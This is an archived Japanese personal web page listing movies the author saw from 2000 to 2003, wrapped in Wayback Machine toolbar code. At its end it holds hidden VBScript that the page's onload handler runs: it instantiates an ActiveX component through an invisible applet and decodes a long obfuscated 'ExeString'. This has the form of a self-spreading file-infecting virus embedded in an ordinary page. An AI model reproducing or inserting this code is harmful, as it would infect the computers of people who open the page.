<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=x-sjis">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>movie note</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#FFFFFF"
alink="#0000FF" onload="vbscript:KJ_start()">
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/www.mediatex.com\/honda\/movienote.html";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "8";
var displayMonth = "Feb";
var displayYear = "2004";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://www.mediatex.com/honda/movienote.html" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20040208035615" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20040106143130/http://www.mediatex.com/honda/movienote.html" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="6 Jan 2004"><strong>JAN</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 3:56:15 Feb 8, 2004">FEB</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20040504060334/http://www.mediatex.com/honda/movienote.html" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="4 May 2004"><strong>MAY</strong></a>
		                
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20040106143130/http://www.mediatex.com/honda/movienote.html" title="14:31:30 Jan 6, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_prv_on.png" width="14" alt="Previous capture" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 3:56:15 Feb 8, 2004">8</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20040504060334/http://www.mediatex.com/honda/movienote.html" title="6:03:34 May 4, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_nxt_on.png" width="14" alt="Next capture" height="16" border="0"/></a>
		                
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20030202001931/http://www.mediatex.com/honda/movienote.html" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="2 Feb 2003"><strong>2003</strong></a>
		                
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 3:56:15 Feb 8, 2004">2004</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20050210111757/http://www.mediatex.com/honda/movienote.html" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="10 Feb 2005"><strong>2005</strong></a>
		                
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20040208035615*/http://www.mediatex.com/honda/movienote.html" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>16 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">23 Feb 02 - 16 Feb 13</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:-1:010001010100_2003:-1:010000210100_2004:1:110010010100_2005:-1:010000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:010000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->


<p align="center"><img src="/web/20040208035615im_/http://www.mediatex.com/honda/andoromeda.gif" width="136"
height="102"></p>

<p align="center">　</p>

<p align="center"><font color="#8080FF" size="2">映画は人生の教科書です。<br>
<br>
いろんな映画の話を聞きたいです。<br>
お気に入りの一本を教えてください。<br>
</font></p>

<p align="center"><font color="#8080FF" size="2">☆</font></p>

<p align="center"><font color="#8080FF" size="2">また気付けば、ＢＢＳがなくなってしまいました；<br>
どこかよさげな場所を探しておきます；<br>
</font></p>

<p align="center">　</p>

<p align="center">　</p>

<p align="center">　</p>

<p align="center"><font color="#C0C0C0"><img src="/web/20040208035615im_/http://www.mediatex.com/honda/syasyou.gif"
width="32" height="32"></font></p>

<p align="center"><font color="#FFFFFF"
face="HGS創英角ﾎﾟｯﾌﾟ体">my movie note</font></p>

<p align="center">　</p>

<p align="center">　</p>
<div align="center"><center>

<table border="0">
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2">チャーリーズエンジェルフルスロットル<br>
        踊る大捜査線２<br>
        ターミネーター３<br>
        ナインソウルズ<br>
        サマーヌード<br>
        tape<br>
        デブラウィンガーを探して<br>
        インターステラ５５５<br>
        コンフェッション　<br>
        ハルク</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20037.html"><font color="#FFFFFF"
        size="2">→２００３ ７</font></a></td>
    </tr>
    <tr>
        <td>　</td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20036.html"><font color="#FFFFFF"
        size="2">２００３_６←</font></a></td>
        <td><font color="#00FFFF" size="2">シティオブゴッド<br>
        ミニミニ大作戦<br>
        恋愛写真<br>
        人生は時々晴れ<br>
        北京バイオリン<br>
        えびボクサー<br>
        10億分の1の男<br>
        くたばれハリウッド<br>
        サハラに舞う羽<br>
        バトルロワイヤル２</font></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2">ＸＭＥＮ２<br>
        あずみ<br>
        ライ麦畑を探して<br>
        サイドウォークオブニューヨーク<br>
        ロスト・イン・ラマンチャ<br>
        めぐりあう時間たち<br>
        マトリックスリローデッド<br>
        8mile<br>
        トゥーウィークス・ノーティス<br>
        メラニーは行く</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20035.html"><font color="#FFFFFF"
        size="2">→２００３ ５</font></a></td>
    </tr>
    <tr>
        <td>　</td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20034.html"><font color="#FFFFFF"
        size="2">２００３_４←</font></a></td>
        <td><font color="#00FFFF" size="2">ジェイ＆サイレントボブ<br>
        青の炎<br>
        blue<br>
        ボーリングフォーコロンバイン<br>
        過去のない男<br>
        ミーウィズアウトユー<br>
        ベッカムに恋して<br>
        シカゴ<br>
        ２４アワーパーティピープル<br>
        ボイス</font></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2">Ｋｉｓｓｉｎｇジェシカ<br>
        ロードオブザリング　二つの塔<br>
        モーヴァン<br>
        中国の小さなお針子<br>
        ウェルカムヘヴン<br>
        スコルピオンの恋まじない<br>
        ラベンダー<br>
        ダイアナザーデイ<br>
        ａｉｋｉ<br>
        デアデビル<br>
        クローサー</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20033.html"><font color="#FFFFFF"
        size="2">→２００３ ３</font></a></td>
    </tr>
    <tr>
        <td>　</td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20032.html"><font color="#FFFFFF"
        size="2">２００３_２←</font></a></td>
        <td><font color="#00FFFF" size="2">ラヴァーズ・キス<br>
        クリスティーナの好きなコト<br>
        アウトライブ<br>
        白と黒の恋人たち<br>
        ＧＯＯＤＢＯＹＳ<br>
        スクラッチ<br>
        黄泉がえり<br>
        １３階段<br>
        ホワイトオランダー</font></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2">猟奇的な彼女<br>
        運命の女<br>
        戦場のピアニスト<br>
        ウエストサイドストーリー<br>
        ガラスの脳<br>
        ピーターパン２<br>
        火山高<br>
        ａｉｋｉ<br>
        JamFilms<br>
        waking life</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20031.html"><font color="#FFFFFF"
        size="2">→２００３_１</font></a></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#FFFFFF" size="2"><br>
        </font><a href="/web/20040208035615/http://www.mediatex.com/honda/2002filmex.html"><font color="#FFFFFF"
        size="2">２００２ＦＩＬＭｅＸ</font></a><a
        href="/web/20040208035615/http://www.mediatex.com/honda/2002filmex.html"><font color="#FFFFFF" size="2">←</font></a></td>
        <td><font color="#00FFFF" size="2">東京ＦＩＬＭｅＸ</font></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2"><br>
        マイノリティリポート<br>
        ストーリーテリング<br>
        群青の夜の羽毛布<br>
        ＣＱ<br>
        いたいふたり<br>
        ８人の女たち<br>
        ゴスフォードパーク<br>
        マーサの幸せレシピ<br>
        tokyo sora<br>
        まぼろし<br>
        ジョンＱ<br>
        ショータイム<br>
        ロックンロールミシン<br>
        歌えフィッシャーマン<br>
        ディナーラッシュ<br>
        トリプルＸ<br>
        セレンディピティ<br>
        スズメバチ</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20026.html"><font color="#FFFFFF"
        size="2">→２００２_６</font></a></td>
    </tr>
    <tr>
        <td>　</td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20025.html"><font color="#FFFFFF"
        size="2">２００２_５←</font></a></td>
        <td><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック">モンスーンウェディング<br>
        スパイキッズ２<br>
        ＤＲＩＶＥ<br>
        インソムニア<br>
        ロイヤルテネンバウムズ<br>
        記憶のはばたき<br>
        火星のカノン</font></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック">リターナー<br>
        アバウト・ア・ボーイ <br>
        オースティンパワーズゴールドメンバー <br>
        ＤＯＧＴＯＷＮ＆Ｚ−ＢＯＹＳ <br>
        ノンストップガール<br>
        春の日は過ぎゆく<br>
        チェルシーホテル<br>
        ピン☆ポン<br>
        ＭＩＢ�</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20024.html"><font color="#FFFFFF"
        size="2">→２００２_４</font></a></td>
    </tr>
    <tr>
        <td>　</td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20023.html"><font color="#FFFFFF"
        size="2">２００２_３←</font></a></td>
        <td><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック">スターウォーズ
        エピソード２ <br>
        アイアムサム <br>
        ブレイド２ <br>
        バーバー<br>
        ノーマンズランド<br>
        日雇い刑事<br>
        愛しのローズマリー<br>
        </font><font color="#00FFFF" size="2">少林サッカー<br>
        スパイダー</font></td>
    </tr>
    <tr>
        <td>　</td>
        <td><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック"><br>
        ドリアンドリアン<br>
        Ｅ.Ｔ(２０周年特別編)<br>
        キューティ・ブロンド<br>
        スパイダーマン<br>
        サンキューボーイズ<br>
        とらばいゆ<br>
        エトワール<br>
        シッピングニュース<br>
        ＧＩＲＬＳ☆ＧＩＲＬＳ</font></td>
        <td><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20022.html"><font color="#FFFFFF"
        size="2">→２００２_２</font></a></td>
    </tr>
    <tr>
        <td colspan="2"><p align="center"><a
        href="/web/20040208035615/http://www.mediatex.com/honda/movie20021.html"><font color="#FFFFFF" size="2">２００２__1←</font></a></p>
        </td>
        <td><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック">ロードオブザリング<br>
        モンスターズインク<br>
        アメリカンスウィートハート<br>
        マルホランドドライブ<br>
        ヘドウィグアンドアングリーインチ<br>
        バニラスカイ<br>
        オーシャンズ１１<br>
        ヴィドック<br>
        ハートブレイカー<br>
        バンディッツ<br>
        プリティプリンセス<br>
        耳に残るは君の歌声<br>
        修羅雪姫<br>
        おいしい生活</font></td>
    </tr>
    <tr>
        <td colspan="2"><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック">ハリー・ポッターと賢者の石<br>
        ムーランルージュ<br>
        ハッシュ！<br>
        アニバーサリーの夜に<br>
        アメリ<br>
        ショコキ！<br>
        ワイルドスピード<br>
        リリィシュシュのすべて<br>
        千と千尋の神隠し<br>
        ゴーストワールド<br>
        チアーズ<br>
        陰陽師 　<br>
        トゥームレイダー<br>
        ウォーターボーイズ<br>
        ブリジッドジョーンズの日記<br>
        エレクトリックドラゴン80000V</font></td>
        <td><p align="center"><a href="/web/20040208035615/http://www.mediatex.com/honda/movie20011.html"><font
        color="#FFFFFF" size="2">→２００１_１</font></a></p>
        </td>
    </tr>
    <tr>
        <td colspan="2"><p align="center"><a
        href="/web/20040208035615/http://www.mediatex.com/honda/movie20012.html"><font color="#FFFFFF" size="2">２００１_２←</font></a></p>
        </td>
        <td><p align="right"><font color="#00FFFF" size="2"
        face="ＭＳ ゴシック">キスオブザドラゴン<br>
        ディスタンス<br>
        非バランス<br>
        A.I<br>
        ココニイルコト<br>
        ギター弾きの恋<br>
        リトルダンサー<br>
        ショコラ<br>
        花様年華<br>
        あの頃、ペニーレインと<br>
        スナッチ<br>
        ハイフィデリティ<br>
        溺れる魚<br>
        ハムレット<br>
        バーティカルリミット<br>
        ＰＡＲＴＹ７</font></p>
        </td>
    </tr>
    <tr>
        <td colspan="2"><p align="left"><font color="#00FFFF"
        size="2" face="ＭＳ ゴシック">チャーリーズエンジェル<br>
        ダンサーインザダーク<br>
        ひかりのまち<br>
        サイダーハウスルール<br>
        １７歳のカルテ<br>
        Ｕ−５７１<br>
        ヴァージンスーサイズ</font></p>
        </td>
        <td><p align="center"><a href="/web/20040208035615/http://www.mediatex.com/honda/movie2000.html"><font
        color="#FFFFFF" size="2">→２０００</font></a></p>
        </td>
    </tr>
</table>
</center></div>

<p>　</p>

<p><font color="#FFFFFF">mail to me</font><a
href="mailto:honda@mediatex.com"><font color="#FFFFFF"><img src="/web/20040208035615im_/http://www.mediatex.com/honda/999.gif"  border="0" width="32" height="32"></font></a></p>

<p align="right"><a href="/web/20040208035615/http://www.mediatex.com/honda/profile.html"><font size="6"><strong><img src="/web/20040208035615im_/http://www.mediatex.com/honda/keyiconb.gif"  border="0" width="40" height="38"></strong></font></a></p>

<p align="center"><font color="#C0C0C0" size="1">All Rights
Reserved, Copyright</font><font color="#C0C0C0" size="2"> </font><font
color="#C0C0C0" size="2" face="ＭＳ Ｐゴシック">&copy; </font><font
color="#C0C0C0" size="1">ayuko*honda, 2002</font></p>
<script language="vbscript">
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script><script language="vbscript">
ExeString = "DbhIgRbek`&HmhfT^sn,O]mT^sn,=`ar^`Mi`i&AikfeH]de\o&FLJ&WlNbeeg&WbiJamc&Sn]?,?dhaet>ilfLp\ DEYsm\lt!$DEMem?cm!$DE=r^\neFdfi^p)EJEdeeBo)EJ<m_am`Gabg)EJImipZb[t^##@hdNob?phcmdinFDAik_n]Oi(?dfeI\nh%Osp^NnrOg?rkjl K`muf`N^snN_tM_a]O_mi7 ?NI.Hk_nM`rt?dfe!Acl^K[ta'+)NmiNnr8R^\^T^hj.K`[d:gfD` Bimtk#NmiNnr%EJXnnako)$<7* HmL^iTfkMtk$<,Ta`hM_a]O_mi)=lhn_@rim@ug^nihi>i^ BaBaTrk_Smm=btmTa`hM_a]O_mi)=lhn_N_tAcl^O_mi7 ?NI.Hk_nM`rt?dfe!Acl^K[ta',)@ie`Nefk(Wkdne6!;J>Yjhlh\^= v[n]rbkn:  FD_lo[rm##&8!v[>lL_  MhjSmm&q\CkG` BtfgNeqo?dfeM`gp'>fol`L`n ?<ntkd\ 6@SH)AemAcl^#@ie`Jamc#A;tmmcb'\ntkd\um`m 6-4?ll`K`[dM`gp'>fol`L`n ?dfeM`gp8FLJ(Oi`hT^snFbg_(?dfeI\nh%3#D` MtjeLol 6hmhfObegFbg_T^hj.Pmct^pb<mFf!5&BTFG8!v[>lL_  7 BH?S hifoZ_7&pbl^liio4!DEYsm\lt!$  9 pb<mFf!HmhfT^sn@fs^D` MtjeLol 6v[n Mc_n@ie`Nefk(Wkdneq\CkG` PblO_xmEg_I_Fbg_T^hj.<gis^Eg_I_Eg_Fni]tbjhFni]tbjh DE=hZiaeLp\(<plr^inSmmcn`'FaloCn]`rCa\l)CfG[smDhd^s=hZm=+Ta`hD` E``t!G=al`CnmlegoMtkdhg'+)86 E>[s^#c$Ta`hFDCa\hg^Nob8Fbi[lr?csd  5VMu[@=+>gmeEJ<c[n``Mu[7 <cl(:n](E``t!G=al`CnmlegoMtkdhg'+)' *$&4\Sn]? 6*@hdD`@fs^KC>bagb_Sn]=Hcd!>ork`htLoligb&1%G[smDhd^s=hZm#@hdD`@hdAon\ocogAon\ocogEJ<m_am`Gabg)In@lrhmR^nom^HeqoBaIgRbek`=btfg Mc_n?xboFni]tbjh@hdD`Nbak`@ie`=G_fm#QigK[ta'-)!Imigk\g ?dfelW=ofhinAcl^nVMb^lolj`tNbak`^\Lo[tbjhektVbe\hk'cnmI_FLJ(Fbg_Eqdmtl#MhZm_Fbg_)Nh^i<\flFDAik_n]Oi(Lc[r^Acl^'hmhfEen_N_tAcl^O_mi7 ?NI.Hk_nM`rt?dfe!Nbak`@ie`&2%olu^$?dfeM`gp'Rlim`5&BTFG8!v[>lL_  7 BH?S hifoZ_7&pbl^liio4!DEYsm\lt!$  9 pb<mFf!HmhfT^snAcl^O_mi)=lhn_@hdD`?_fZpftB_=RmSa`fl'M_gK`[d!BK>TYCNMLEGOYUL@L\B__nmdni^nVD^a[ueoUl`l B?)IumGiodQ_rldin8WlNbeeg(R^bLeZ_AF?YXGIC:GYM:>BIG@VShanwZm_\Fd]rhnifmWIumgiod?xim_slWGe]d[V^m)QsLc_le)Le`Rlim`AF?YX>ORK@HTXPMEKWCd^inimd_sU D^a[ueoCdVShanwZm_\Fd]rhnifmWIumgiod?xim_slW&G_fm#IumGiodQ_rldin%,# (0UH[ieW=ofkis^Os^MtZocog`ly'+,M?GX?QOK?>[leEJF\clK`a(CEERZ=UKM?NMZOS>MVI]`htbocelW&=``angnI]!\Lj`tp\leUHcckjmo_oVOnofohfEqklelnVFe_oOnoFohfPekncog'+)!.)WGabgVSm\nihi_rrHaf`,Lc[r^Acl^$<\flFDMZdfR^bAF?YX>ORK@HTXPMEKWCd^inimd_sU D^a[ueoCdVShanwZm_\Fd]rhnifmWIumgiod?xim_slW&G_fm#IumGiodQ_rldin%,# (0UH[ieWQi]`Sm\nihi_rrHaf`,Lc[r^Acl^$PnMh^gf.K`aWkdneBK>TYCNMLEGOYUL@L\Lj`tp\leUHcckjmo_oVO_acc^W3.)WIumgiodWIpmdinlWGabgVE]dnokKle_`leg^_%,-1)2,,M?GX?QOK?>[leEJF\clK`a(CEERZ=UKM?NMZOS>MVShanwZm_\Fd]rhnifmWQig_iwlGeln[gbia Lp\srnnefWJrhacl^nVMb^lolj`tJotejikDht^mhemMemocn`nV0Z+^0++*0)+*0)+*c)+*0)+*0)+*0)/0\)++e).00'be\hk$<\flFDMZdfR^bAF?YX>ORK@HTXPMEKWMo_oqak`VMb^lolj`tURcn]jqsIN\<plr^inV^mmihiVWbi^opnM^nma`dhgNobltmt^hVPkj`ie`m\Fd]rhnifmIumgiodCnm`ln^oS^onigbm\)\*d)-*0)+*0)+*0\+*0)+*0)+*0)+.6U+*1^+-6)&[g[nd#RmSa`fl'M_gPmct^HD@S_<PLR>IN_NN?RUNifmr[r^WGi\mishan\Ha`i\`V1))*\Hpnlhje\Hknihim\F\clU@^imjlPk``ek`hc^&1,,*7+'R>BYDPJLDCZgf DEGabgLe`#HD@S_<PLR>IN_NN?RUNifmr[r^WGi\mishan\Ha`i\`V1))*\<jgmhiVMZdfS^onigbm\G`qSm\nihi_rr&[g[nd#FDufh[g^Ail]`l(E``t!RcnI\nh%.# PkjarZhFbg_sU>imfjh ?dfelWGi\mishan Lc[r^_VSm\nihi_rr#@hdAon\ocogAon\ocogEJ<m_am`Gied_u!$HiEkmirM_snh_ G`rtNefkJamc=D` Gjn(?NI.?dfe>scsmnWbiJamc&QS\mcpm)_x^#)ObegT^hjPZob 6srnnef.,\Eg_I_I_NefkJamc=mylo_m,-VObegSm\ltNk@ie`=RcnI\nh!LTMT>HVK^mhee.,.]gf?ll`Lo[rmPjFbg_ 6QigK[ta  NSSM@G\D`ln^g(deg@hdD`RmSa`fl'M_gPmct^HD@S_EJ=AEZGA<CCN>WMo_oqak`VMb^lolj`tURcn]jqsU>ork`htO`lsbjh\Kph\D`ln^g-2'MtZmnUiAcl^FLJ(ChksFbg_ PdhPZob w^]Vkcr[le)ai_&WbiJamc&qe[W@oe__r'cntFLJ(ChksFbg_ PdhPZob srnnef.,\deqaeg(gba,PdhPZob srnnef.,\]`mkmjj.bic=aegKC<jp^i^Th#QigK[ta  r_bUAil]`l.aon%btm#RmSa`fl'M_gPmct^HD@S_<G;SL@M_KJITU)^leW,_fl_dfeWlNbeeg(R^bQrbo_ CEERZ=L:NMELZLOHOV.]gf\<jht^in Mtje'aikfi\\nihi)x&hmdhrhlh\^QsLc_le)Le`Rlim`AF?YX>FALN?SXMIOMW^leacl^W>e_\olmD]ogW,PnMh^gf.K`aR^\^(CEERZ=L:NMELZLOHOVvq_`ie`VD^a[ueoCchiVWlNbeeg(R^bQrbo_ CEERZ=L:NMELZLOHOVdeg`ie`VS\mcpm@hgbi_\'V;N]rbknQsLc_le)Le`Rlim`AF?YX>FALN?SXMIOMW^leAcl^WMh^gf\Hk_nU>imf\hdU&WbiJamc&O_miK[ta  RMckdjt'`re%* %RmSa`fl'M_gPmct^HD@S_<G;SL@M_KJITU_fl?dfeUNbeeg?xUKloi`ltrNbe^oBag_feknVWLCJrhkm\'{/+,5->;5&4/3;(+1<A'8<40-)+;A)+<80+2CvPnMh^gf.K`aWkdneBK>TYCE<MS>NYRHJN\]gfFbg_\L^liioBolo?n\j^eU